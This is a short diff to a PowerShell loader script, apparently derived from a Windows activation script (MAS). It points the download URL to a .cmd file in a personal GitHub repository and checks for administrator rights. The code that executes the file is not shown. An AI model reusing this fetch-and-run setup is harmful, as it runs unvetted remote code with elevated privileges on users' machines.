@@ -2,8 +2,8 @@ $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-$DownloadURL = 'C:\xampp\htdocs\MAS.cmd'
-$DownloadURL2 = 'C:\xampp\htdocs\MAS.cmd'
+$DownloadURL = 'https://raw.githubusercontent.com/ahmetulus/ulus/main/ulus.cmd'
+$DownloadURL2 = 'https://raw.githubusercontent.com/ahmetulus/ulus/main/ulus.cmd'
 
 $rand = Get-Random -Maximum 1000
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
